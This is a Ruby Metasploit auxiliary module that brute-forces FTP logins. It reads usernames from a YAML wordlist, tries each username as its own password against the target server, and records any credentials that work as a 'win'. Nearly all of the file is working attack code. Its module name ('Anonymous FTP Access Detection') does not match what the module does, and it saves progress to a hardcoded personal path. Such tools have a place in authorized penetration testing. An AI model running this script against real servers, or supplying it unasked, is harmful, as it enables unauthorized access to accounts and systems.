#
# Threaded FTP login brute forcing
#

require 'msf/core'
require 'yaml'

class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Remote::Ftp
    include Msf::Auxiliary::Scanner
    include Msf::Auxiliary::Report

    def initialize
        super(
            'Name'          => 'Anonymous FTP Access Detection',
            'Version'       => '0.0.1',
            'Description'   => 'Brute forces FTP username/password combos.',
            'References'    =>
                [
                    ['URL', 'http://en.wikipedia.org/wiki/Brute_force_attack'],
                ],
            'Author'        => 'dougsko <dougtko[at]gmail.com>',
            'License'       => BSD_LICENSE
        )
    
        register_options(
            [
                Opt::RPORT(21),
                OptString.new('USERLIST', [true, 'Path to the file containing usernames to try.', 'data/wordlists/usernames.yaml']),
                OptString.new('RHOSTS', [true, 'Remote FTP server.', 'localhost']),
            ], self.class)
    end
    
    def connect_login(user, pass, global = true, verbose = true)
        ftpsock = connect(global, verbose)

        if (not (user and pass))
            print_status("No username and password were supplied, unable to login")
            return false
        end

        print_status("Authenticating as #{user} with password #{pass}...") if verbose
        res = send_user(user, ftpsock)
        
        if (res !~ /^(331|2)/)
            print_status("The server rejected our username") if verbose
            return false
        end

        if (pass)
            print_status("Sending password...") if verbose
            res = send_pass(pass, ftpsock)
            if (res !~ /^2/)
                print_status("The server rejected our password") if verbose
                return false
            end
        end
        
        return true
    end

    def run_host(target_host)
        count = 1
        begin
        
        # get user and pass from list
        users = YAML.load(File.open(datastore['USERLIST']))
        puts users.size
        while ! users.empty?
            user = users.pop
            pass = user    
            res = connect_login(user, pass, false)

            banner.strip! if banner

            if res 
                print_status("I WIN!!! #{user}:#{pass}")
                report_auth_info(
                    :host   => target_host,
                    :proto  => 'FTP',
                    :user   => user,
                    :pass   => pass,
                    :targ_host      => target_host,
                    :targ_port      => rport
                )
            end

            if count % 10 == 0
                puts users.size.to_s
                YAML.dump(users, File.open("/home/doug/.msf3/ftp_brute.yaml", "w"))
            end
            count += 1
            disconnect
        end 
        rescue ::Interrupt
            raise $!
        rescue ::Rex::ConnectionError, ::IOError
        end
    end
end
